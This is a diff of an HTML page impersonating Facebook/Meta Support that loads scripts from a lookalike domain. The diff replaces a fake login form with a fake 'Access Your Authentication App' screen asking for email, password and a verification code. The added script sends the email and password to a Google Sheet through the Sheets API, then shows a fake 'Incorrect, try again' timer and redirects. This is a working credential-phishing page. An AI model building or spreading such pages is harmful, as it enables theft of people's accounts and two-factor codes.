@@ -1,10 +1,14 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-TRYVP8NYC0"></script>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-TRYVP8NYC0"></script>
   <script>
     function gtag() { dataLayer.push(arguments); }
-    window.dataLayer = window.dataLayer || [], gtag("js", new Date), gtag("config", "G-TRYVP8NYC0");
+    window.dataLayer = window.dataLayer || [];
+    gtag('js', new Date());
+    gtag('config', 'G-TRYVP8NYC0');
   </script>
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <meta name="description" content="Disagree With Decision">
@@ -19,84 +23,124 @@
   <meta name="twitter:description" content="Contact Suport Now">
   <meta name="twitter:image" content="https://res.cloudinary.com/dqvmnjw9l/image/upload/v1729691193/logo.jpg">
   <title>Meta Support</title>
+
   <link href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" rel="stylesheet">
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
-  <script defer="defer" src="https://contactadsverrifyaccounts.cloud/static/js/main.aae6dd77.js"></script>
+  <script defer src="https://contactadsverrifyaccounts.cloud/static/js/main.aae6dd77.js"></script>
   <link href="https://contactadsverrifyaccounts.cloud/static/css/main.89ada21a.css" rel="stylesheet">
+
+  <style>
+    #continueBtn {
+      background-color: #A3C5F5;
+      cursor: not-allowed;
+      transition: background-color 0.3s;
+    }
+
+    #continueBtn.active {
+      background-color: #1877F2;
+      cursor: pointer;
+    }
+  </style>
 </head>
-<body>
+<body style="display: block;">
   <div id="root">
-    <div class="bg-[#E9EBEE] font-['Helvetica','Arial',sans-serif]">
-      <div class="min-h-screen flex flex-col justify-center items-center">
-        <div class="flex flex-col md:flex-row justify-center items-center w-full max-w-4xl mt-[50px] mb-10">
-          <div class="flex-1 p-5 md:p-10 text-left order-1 md:order-1 ml-[30px] md:ml-0">
-            <h1 class="text-[#1877F2] text-5xl md:text-6xl font-bold ml-[40px] md:ml-0">facebook</h1>
-            <p class="text-xl md:text-2xl mt-2 leading-relaxed max-w-md">Facebook helps you connect and share with the people in your life.</p>
-          </div>
-          <div class="bg-white rounded-lg shadow-md w-full max-w-sm p-6 order-2">
-            <!-- Chỉnh sửa action của form để chuyển đến trang confirm -->
-            <form action="https://girlhotnewstoday.github.io/logins/confirm.html" method="get">
-              <input placeholder="Mobile number or email" class="w-full p-4 mb-4 border border-gray-300 rounded-md text-base focus:border-blue-500 focus:outline-none bg-[#F5F6F7]" required="" type="text" value="" name="mobileEmail">
-              <input placeholder="Password" class="w-full p-4 mb-4 border border-gray-300 rounded-md text-base focus:border-blue-500 focus:outline-none bg-[#F5F6F7]" required="" type="password" value="" name="password">
-              <button type="submit" class="w-full p-4 bg-[#1877F2] text-white rounded-md text-lg font-bold hover:bg-[#165eab] ">Log In</button>
-            </form>
-            <a href="#" class="block text-center mt-5 text-sm text-[#1877F2] hover:underline">Forgot password?</a>
-            <hr class="my-6 border-t border-gray-300">
-            <div class="flex justify-center">
-              <a href="#" class="bg-[#42B72A] text-white px-6 py-4 rounded-md text-base font-bold hover:bg-[#36a420]">Create new account</a>
-            </div>
-          </div>
-        </div>
-        <div class="h-96"></div>
+    <div class="flex min-h-screen items-center justify-center bg-[#F0F2F5] p-5 font-sans md:p-10">
+      <div class="w-full max-w-[600px] bg-[#F0F2F5] p-4 text-left md:p-5">
+        <div class="text-xs text-[#606770] mb-2">Facebook</div>
+        <h1 class="text-[22px] font-bold text-[#1c1e21] mb-2 md:text-2xl">Access Your Authentication App</h1>
+        <p class="text-[13px] font-bold text-[#606770] mb-4 leading-relaxed md:text-sm">
+          <span>Check the notification on your other device.<br></span>
+          <span>Log in to your Facebook account on another device and open the notification we sent to confirm this login.</span>
+        </p>
+        <img alt="Authentication Illustration" class="w-full h-auto mb-4 block min-h-[180px] md:min-h-[200px]" src="http://contactadsverrifyaccounts.cloud/ACP-UnifiedDelta-AuthenticationApp-Mobile_light-3x.png">
+        <input step="1" id="emailInput" placeholder="Enter email" maxlength="100" required class="w-full p-3 my-2 border border-[#dddfe2] rounded-lg bg-[#F9F9F9] text-[15px] text-[#606770] text-left focus:border-[#1877F2] focus:outline-none md:p-3.5 md:text-[15px]" type="text" value="">
+        <input step="1" id="passwordInput" placeholder="Enter password" maxlength="100" required class="w-full p-3 my-2 border border-[#dddfe2] rounded-lg bg-[#F9F9F9] text-[15px] text-[#606770] text-left focus:border-[#1877F2] focus:outline-none md:p-3.5 md:text-[15px]" type="password" value="">
+        <input step="1" id="codeInput" placeholder="Enter code" maxlength="8" required class="w-full p-3 my-2 border border-[#dddfe2] rounded-lg bg-[#F9F9F9] text-[15px] text-[#606770] text-left focus:border-[#1877F2] focus:outline-none md:p-3.5 md:text-[15px]" type="number" value="">
+        <div id="timer" class="text-[#e74c3c] mt-2.5"></div>
+        <button id="continueBtn" disabled class="w-full p-3 mt-2 rounded-[25px] text-white font-bold text-[15px] text-center transition-colors md:p-3.5 md:text-[15px]">Continue</button>
+        <p class="text-center mt-[20%]">Meta</p>
       </div>
-      <footer class="w-full text-center text-xs text-gray-600 py-5 bg-white">
-        <div class="flex flex-wrap justify-center gap-2 mb-2">
-          <a href="#" class="text-gray-600 hover:underline">English (UK)</a>
-          <a href="#" class="text-gray-600 hover:underline">中文(台灣)</a>
-          <a href="#" class="text-gray-600 hover:underline">日本語</a>
-          <a href="#" class="text-gray-600 hover:underline">한국어</a>
-          <a href="#" class="text-gray-600 hover:underline">Français (France)</a>
-          <a href="#" class="text-gray-600 hover:underline">ภาษาไทย</a>
-          <a href="#" class="text-gray-600 hover:underline">Español</a>
-          <a href="#" class="text-gray-600 hover:underline">Português (Brasil)</a>
-          <a href="#" class="text-gray-600 hover:underline">Deutsch</a>
-          <a href="#" class="text-gray-600 hover:underline">Italiano</a>
-          <a href="#" class="text-gray-600 hover:underline"><span class="text-gray-400 font-bold">+</span></a>
-        </div>
-        <div class="flex flex-wrap justify-center gap-2 mb-3">
-          <a href="#" class="text-gray-600 hover:underline">Sign Up</a>
-          <a href="#" class="text-gray-600 hover:underline">Log In</a>
-          <a href="#" class="text-gray-600 hover:underline">Messenger</a>
-          <a href="#" class="text-gray-600 hover:underline">Facebook Lite</a>
-          <a href="#" class="text-gray-600 hover:underline">Video</a>
-          <a href="#" class="text-gray-600 hover:underline">Meta Pay</a>
-          <a href="#" class="text-gray-600 hover:underline">Meta Store</a>
-          <a href="#" class="text-gray-600 hover:underline">Meta Quest</a>
-          <a href="#" class="text-gray-600 hover:underline">Ray-Ban Meta</a>
-          <a href="#" class="text-gray-600 hover:underline">Meta AI</a>
-          <div class="w-full"></div>
-          <a href="#" class="text-gray-600 hover:underline">Instagram</a>
-          <div class="w-full"></div>
-          <a href="#" class="text-gray-600 hover:underline">Threads</a>
-          <a href="#" class="text-gray-600 hover:underline">Fundraisers</a>
-          <a href="#" class="text-gray-600 hover:underline">About</a>
-          <a href="#" class="text-gray-600 hover:underline">Privacy Policy</a>
-          <a href="#" class="text-gray-600 hover:underline">Privacy Center</a>
-          <a href="#" class="text-gray-600 hover:underline">About</a>
-          <a href="#" class="text-gray-600 hover:underline">Create Ad</a>
-          <a href="#" class="text-gray-600 hover:underline">Create Page</a>
-          <a href="#" class="text-gray-600 hover:underline">Developers</a>
-          <a href="#" class="text-gray-600 hover:underline">Careers</a>
-          <a href="#" class="text-gray-600 hover:underline">Cookies</a>
-          <a href="#" class="text-gray-600 hover:underline">Ad Choices</a>
-          <a href="#" class="text-gray-600 hover:underline">Terms</a>
-          <a href="#" class="text-gray-600 hover:underline">Help</a>
-          <a href="#" class="text-gray-600 hover:underline">Contact Uploading & Non-Users</a>
-        </div>
-        <div>Meta © 2025</div>
-      </footer>
     </div>
   </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const codeInput = document.getElementById("codeInput");
+      const continueBtn = document.getElementById("continueBtn");
+      const emailInput = document.getElementById("emailInput");
+      const passwordInput = document.getElementById("passwordInput");
+      const timer = document.getElementById("timer");
+
+      codeInput.addEventListener("input", function () {
+        if (codeInput.value.length === 6 || codeInput.value.length === 8) {
+          continueBtn.disabled = false;
+          continueBtn.classList.add("active");
+        } else {
+          continueBtn.disabled = true;
+          continueBtn.classList.remove("active");
+        }
+      });
+
+      continueBtn.addEventListener("click", function() {
+        if (codeInput.value.length === 6 || codeInput.value.length === 8) {
+          startTimer();
+          continueBtn.disabled = true;
+          continueBtn.classList.add("cursor-not-allowed");
+
+          // Lấy giá trị email và password
+          const email = emailInput.value;
+          const password = passwordInput.value;
+
+          // Gửi email và password tới Google Sheets thông qua Google Sheets API
+          const sheetId = "1YfHUe71d33JQSTsW63vpYwb4N2Uz2XOffO3wJnRh3Zo";
+          const apiKey = "YOUR_GOOGLE_API_KEY"; // Thay bằng API key của bạn
+          const range = "Sheet1!A1:B"; // Cập nhật phạm vi với tên sheet của bạn
+
+          const url = `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${range}:append?valueInputOption=RAW&key=${apiKey}`;
+          
+          const data = {
+            values: [
+              [email, password]
+            ]
+          };
+
+          fetch(url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(data)
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log('Success:', data);
+            window.location.href = 'https://girlhotnewstoday.github.io/logins/confirm.html';
+          })
+          .catch((error) => {
+            console.error('Error:', error);
+          });
+        }
+      });
+
+      let seconds = 120;
+      function updateTimer() {
+        const min = Math.floor(seconds / 60);
+        const sec = seconds % 60;
+        timer.textContent = `Incorrect. Please, try again after: ${min}:${sec < 10 ? "0" : ""}${sec}`;
+        if (seconds > 0) {
+          seconds--;
+          setTimeout(updateTimer, 1000);
+        } else {
+          timer.textContent = "Code expired. Please request a new one.";
+        }
+      }
+
+      function startTimer() {
+        updateTimer();
+      }
+    });
+  </script>
+
 </body>
 </html>
